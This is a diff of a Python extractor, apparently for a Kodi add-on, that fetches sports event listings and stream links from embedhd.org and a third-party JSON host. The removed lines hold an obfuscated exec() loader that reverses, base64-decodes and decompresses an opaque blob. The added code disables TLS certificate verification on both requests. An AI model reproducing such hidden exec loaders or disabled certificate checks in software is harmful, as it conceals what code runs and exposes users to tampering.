@@ -1,2 +1,110 @@
-# -------------------------------
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+from ..models import *
+from typing import Optional, List
+from datetime import datetime, timezone
+import requests
+import xbmc
+
+def fix_league(s: str) -> str:
+    return " ".join(x.capitalize() for x in s.split()) if len(s) > 5 else s.upper()
+
+class EmbedHD(JetExtractor):
+    def __init__(self) -> None:
+        self.domains = ["embedhd.org"]
+        self.name = "EmbedHD"
+
+    def get_items(self, params: Optional[dict] = None, progress: Optional[JetExtractorProgress] = None) -> List[JetItem]:
+        items = []
+        if self.progress_init(progress, items):
+            return items
+        
+        try:
+            headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "Accept": "application/json",
+                "Referer": "https://embedhd.org/"
+            }
+            api_response = requests.get("https://embedhd.org/api-event.php", timeout=10, verify=False, headers=headers).json()
+        except Exception as e:
+            xbmc.log(f"[EmbedHD] Error fetching API: {str(e)}", xbmc.LOGERROR)
+            return items
+        
+        now = datetime.now(timezone.utc)
+        for day in api_response.get("days", []):
+            for match in day.get("items", []):
+                title = match["title"]
+                league_raw = match["league"]
+                league = fix_league(league_raw)
+                
+                ts_et = match.get("ts_et")
+                if ts_et:
+                    match_time = datetime.fromtimestamp(ts_et, tz=timezone.utc)
+                    if (match_time - now).total_seconds() > 86400:
+                        continue
+                else:
+                    match_time = None
+                
+                # xbmc.log(f"[EmbedHD] Found match: {title} ({league}) at {match_time}", xbmc.LOGINFO)
+                
+                streams = match.get("streams", [])
+                links = [JetLink(stream["link"], links=False, name=f"HD{stream['hd']}") for stream in streams if stream.get("link")]
+                
+                items.append(JetItem(title, links, match_time, league=league))
+        
+        return items
+
+    def get_links(self, url):
+        return []
+
+    def get_link(self, url):
+        xbmc.log(f"[EmbedHD] Looking up stream from JSON for: {url.address}", xbmc.LOGINFO)
+        
+        try:
+            json_url = "https://magnetic.website/Jetextractor/EmbedHD/embedhd_scrape1.json"
+            response = requests.get(json_url, timeout=10, verify=False)
+            response.raise_for_status()
+            json_data = response.json()
+            
+            # xbmc.log(f"[EmbedHD] Loaded JSON with {len(json_data)} entries", xbmc.LOGINFO)
+            
+            # Search for matching URL in the JSON data
+            for entry in json_data:
+                if entry.get("url") == url.address:
+                    # xbmc.log(f"[EmbedHD] Found match: {entry.get('title', 'Unknown')}", xbmc.LOGINFO)
+                    
+                    # Get the links array
+                    links = entry.get("links", [])
+                    if not links:
+                        xbmc.log(f"[EmbedHD] No links found in JSON entry", xbmc.LOGWARNING)
+                        return JetLink("", name="No links available")
+                    
+                    link_data = links[0]
+                    stream_address = link_data.get("address")
+                    
+                    if not stream_address:
+                        xbmc.log(f"[EmbedHD] No address found in link data", xbmc.LOGWARNING)
+                        return JetLink("", name="No stream address")
+                    headers = link_data.get("headers", {})
+                    # Remove empty header values
+                    headers = {k: v for k, v in headers.items() if v}
+                    
+                    if not headers:
+                        headers = {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
+                        }
+                    
+                    xbmc.log(f"[EmbedHD] Returning stream: {stream_address[:80]}...", xbmc.LOGINFO)
+                    # xbmc.log(f"[EmbedHD] Headers (filtered): {headers}", xbmc.LOGDEBUG)
+                    
+                    return JetLink(
+                        stream_address,
+                        headers=headers,
+                        inputstream=JetInputstreamFFmpegDirect.default()
+                    )
+            
+            # No match found
+            xbmc.log(f"[EmbedHD] No matching URL found in JSON for: {url.address}", xbmc.LOGWARNING)
+            return JetLink("", name="Stream not found in database")
+            
+        except Exception as e:
+            xbmc.log(f"[EmbedHD] Error fetching JSON or parsing: {str(e)}", xbmc.LOGERROR)
+            return JetLink("", name=f"Error: {str(e)}")
